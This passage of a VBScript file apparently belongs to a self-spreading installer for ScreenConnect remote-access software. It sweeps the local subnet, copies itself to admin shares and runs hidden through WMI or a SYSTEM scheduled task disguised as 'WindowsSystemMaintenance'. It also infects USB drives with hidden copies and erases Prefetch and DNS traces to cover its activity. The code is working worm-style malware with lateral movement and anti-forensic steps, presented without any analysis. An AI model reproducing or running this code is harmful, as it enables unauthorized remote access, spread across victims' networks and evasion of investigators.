    If UBound(aIPParts) <> 3 Then Exit Sub
    sBaseIP = aIPParts(0) & "." & aIPParts(1) & "." & aIPParts(2) & "."
    
    ' Scan hosts
    Dim iPing, sTargetIP, sPCList
    sPCList = ""
    
    For iPing = 1 To 254
        sTargetIP = sBaseIP & iPing
        
        If sTargetIP <> sLocalIP Then
            Dim oExec, sPingResult
            Set oExec = oShell.Exec("ping -n 1 -w " & NETWORK_TIMEOUT_MS & " " & sTargetIP)
            sPingResult = oExec.StdOut.ReadAll
            
            If InStr(1, sPingResult, "TTL=", vbTextCompare) > 0 Then
                LogMessage "[SPREAD] Host alive: " & sTargetIP
                
                If DeployToTarget(sTargetIP) Then
                    If sPCList <> "" Then sPCList = sPCList & ", "
                    sPCList = sPCList & sTargetIP
                End If
            End If
        End If
    Next
    
    g_NetworkPCs = sPCList
    If g_NetworkPCs = "" Then g_NetworkPCs = "None found"
    LogMessage "[SPREAD] Complete. Deployed to: " & g_NetworkPCs
    On Error GoTo 0
End Sub

Function DeployToTarget(sTargetIP)
    DeployToTarget = False
    On Error Resume Next
    
    ' Check admin share
    If Not oFSO.FolderExists("\\" & sTargetIP & "\C$") Then
        Exit Function
    End If
    
    ' Copy script
    Dim sDestPath
    sDestPath = "\\" & sTargetIP & "\C$\Windows\Temp\winsys.vbs"
    oFSO.CopyFile sHiddenScriptPath, sDestPath, True
    
    If Err.Number <> 0 Then
        Err.Clear
        Exit Function
    End If
    
    ' Execute remotely via WMI
    Dim oRemoteWMI, oRemoteProcess, oRemoteConfig
    Set oRemoteWMI = GetObject("winmgmts:\\" & sTargetIP & "\root\cimv2")
    
    If Err.Number <> 0 Then
        Err.Clear
        ' Fallback: scheduled task
        oShell.Run "schtasks /create /s " & sTargetIP & _
                   " /tn ""WindowsSystemMaintenance"" " & _
                   " /tr ""wscript.exe //B C:\Windows\Temp\winsys.vbs"" " & _
                   " /sc ONCE /st 00:00 /ru SYSTEM /rl HIGHEST /f", 0, True
        oShell.Run "schtasks /run /s " & sTargetIP & " /tn ""WindowsSystemMaintenance""", 0, True
    Else
        Set oRemoteConfig = oRemoteWMI.Get("Win32_ProcessStartup").SpawnInstance_
        oRemoteConfig.ShowWindow = 0
        Set oRemoteProcess = oRemoteWMI.Get("Win32_Process")
        oRemoteProcess.Create "wscript.exe //B C:\Windows\Temp\winsys.vbs", Null, oRemoteConfig, 0
    End If
    
    If Err.Number = 0 Then
        DeployToTarget = True
        LogMessage "[SPREAD] Deployed to " & sTargetIP
    End If
    
    On Error GoTo 0
End Function

'==========================================================================
' USB SPREAD
'==========================================================================
Sub StartUSBMonitor()
    On Error Resume Next
    LogMessage "[USB] Setting up USB monitor..."
    
    Dim sUSBScript: sUSBScript = sTempDir & "\USB_Monitor.vbs"
    Dim oFile
    Set oFile = oFSO.CreateTextFile(sUSBScript, True)
    oFile.WriteLine "' USB Spread Monitor"
    oFile.WriteLine "Set oShell = CreateObject(""WScript.Shell"")"
    oFile.WriteLine "Set oFSO = CreateObject(""Scripting.FileSystemObject"")"
    oFile.WriteLine "Set oWMI = GetObject(""winmgmts:\\.\root\cimv2"")"
    oFile.WriteLine ""
    oFile.WriteLine "Do While True"
    oFile.WriteLine "    Set colDrives = oWMI.ExecQuery(""SELECT * FROM Win32_LogicalDisk WHERE DriveType=2"")"
    oFile.WriteLine "    For Each oDrive In colDrives"
    oFile.WriteLine "        Dim sDrive : sDrive = oDrive.DeviceID & ""\"""
    oFile.WriteLine "        Dim sMarker : sMarker = sDrive & ""SC_Infect.mrk"""
    oFile.WriteLine ""
    oFile.WriteLine "        If Not oFSO.FileExists(sMarker) Then"
    oFile.WriteLine "            oFSO.CopyFile """ & sMsiPath & """, sDrive & ""SC_Installer.msi"", True"
    oFile.WriteLine "            oFSO.CopyFile """ & WScript.ScriptFullName & """, sDrive & ""SC_Install.vbs"", True"
    oFile.WriteLine "            oFSO.CreateTextFile(sMarker).Close"
    oFile.WriteLine "            oShell.Run ""cmd /c attrib +h """" & sDrive & ""SC_Installer.msi"""""", 0, True"
    oFile.WriteLine "            oShell.Run ""cmd /c attrib +h """" & sDrive & ""SC_Install.vbs"""""", 0, True"
    oFile.WriteLine "            oShell.Run ""cmd /c attrib +h """" & sDrive & ""SC_Infect.mrk"""""", 0, True"
    oFile.WriteLine "        End If"
    oFile.WriteLine "    Next"
    oFile.WriteLine "    WScript.Sleep 5000"
    oFile.WriteLine "Loop"
    oFile.Close
    
    oShell.Run "wscript.exe """ & sUSBScript & """", 0, False
    LogMessage "[USB] Monitor started."
    On Error GoTo 0
End Sub

'==========================================================================
' FINAL CLEANUP
'==========================================================================
Sub FinalCleanup()
    On Error Resume Next
    LogMessage "[CLEANUP] Cleaning up..."
    
    If oFSO.FileExists(sMsiPath) Then
        oFSO.DeleteFile sMsiPath, True
        LogMessage "[CLEANUP] MSI deleted."
    End If
    
    ' Clean temp MSI files
    Dim oFolder, oFile
    If oFSO.FolderExists(sTempDir) Then
        Set oFolder = oFSO.GetFolder(sTempDir)
        For Each oFile In oFolder.Files
            If LCase(oFSO.GetExtensionName(oFile.Name)) = "msi" Then
                If InStr(1, oFile.Name, "ScreenConnect", vbTextCompare) > 0 Or _
                   InStr(1, oFile.Name, "56BSSW", vbTextCompare) > 0 Then
                    oFSO.DeleteFile oFile.Path, True
                End If
            End If
        Next
        Set oFolder = Nothing
    End If
    
    ' Clean prefetch
    oShell.Run "cmd /c del /f /s /q C:\Windows\Prefetch\*SC_* > nul 2>&1", 0, True
    oShell.Run "cmd /c del /f /s /q C:\Windows\Prefetch\*ScreenConnect* > nul 2>&1", 0, True
    
    ' Flush DNS
    oShell.Run "ipconfig /flushdns", 0, True
    
    LogMessage "[CLEANUP] Complete."
    On Error GoTo 0
End Sub

'==========================================================================
' HELPER FUNCTIONS
'==========================================================================
Function IsScriptElevated()
    IsScriptElevated = False
    On Error Resume Next
    Dim sTestFile
    sTestFile = oShell.ExpandEnvironmentStrings("%WINDIR%") & "\test_admin.tmp"
    oFSO.CreateTextFile(sTestFile).Close
    If Err.Number = 0 Then
        oFSO.DeleteFile sTestFile
        IsScriptElevated = True
    End If
    On Error GoTo 0
End Function

Sub ElevateScript()
    Dim oShellApp
    Set oShellApp = CreateObject("Shell.Application")
    oShellApp.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """", "", "runas", 0
End Sub

Sub LogMessage(sMessage)
    On Error Resume Next
    Dim oLogFile
    Set oLogFile = oFSO.OpenTextFile(sLogFile, 8, True)
    If Err.Number = 0 Then
        oLogFile.WriteLine FormatDateTime(Now, 0) & " | " & sMessage
        oLogFile.Close
    End If
    On Error GoTo 0
End Sub

Sub CleanupOldLogs(nKeepCount)
    On Error Resume Next
    Dim oFolder, oFile, aLogFiles(), nCount, i
    If Not oFSO.FolderExists(sTempDir) Then Exit Sub
    Set oFolder = oFSO.GetFolder(sTempDir)
    nCount = 0
    For Each oFile In oFolder.Files
        If InStr(1, oFile.Name, "ScreenConnect_Install", vbTextCompare) > 0 Then
            ReDim Preserve aLogFiles(nCount)
            Set aLogFiles(nCount) = oFile
            nCount = nCount + 1
        End If
    Next
    If nCount > nKeepCount Then
        For i = 0 To nCount - nKeepCount - 1
            aLogFiles(i).Delete True
        Next
    End If
    On Error GoTo 0
End Sub

Function GetHiveName(lHive)
    Select Case lHive
        Case &H80000002: GetHiveName = "HKLM"
        Case &H80000001: GetHiveName = "HKCU"
        Case Else: GetHiveName = "UNKNOWN"
    End Select
End Function

Function FormatFileSize(nBytes)
    If nBytes < 1024 Then
        FormatFileSize = nBytes & " B"
    ElseIf nBytes < 1048576 Then
        FormatFileSize = Round(nBytes / 1024, 2) & " KB"
    ElseIf nBytes < 1073741824 Then
        FormatFileSize = Round(nBytes / 1048576, 2) & " MB"
    Else
        FormatFileSize = Round(nBytes / 1073741824, 2) & " GB"
    End If
End Function

Function FormatDateForFile(dtDate)
    FormatDateForFile = Year(dtDate) & Right("0" & Month(dtDate), 2) & _
                        Right("0" & Day(dtDate), 2) & "_" & _
                        Right("0" & Hour(dtDate), 2) & _
                        Right("0" & Minute(dtDate), 2) & _
                        Right("0" & Second(dtDate), 2)
End Function

Sub CreateNestedFolders(sPath)
    On Error Resume Next
    If Not oFSO.FolderExists(sPath) Then
        Dim sParentPath: sParentPath = oFSO.GetParentFolderName(sPath)
        If Not oFSO.FolderExists(sParentPath) Then CreateNestedFolders sParentPath
        oFSO.CreateFolder sPath
    End If
    On Error GoTo 0
End Sub

'==========================================================================
' END OF SCRIPT
'==========================================================================
WScript.Quit(0)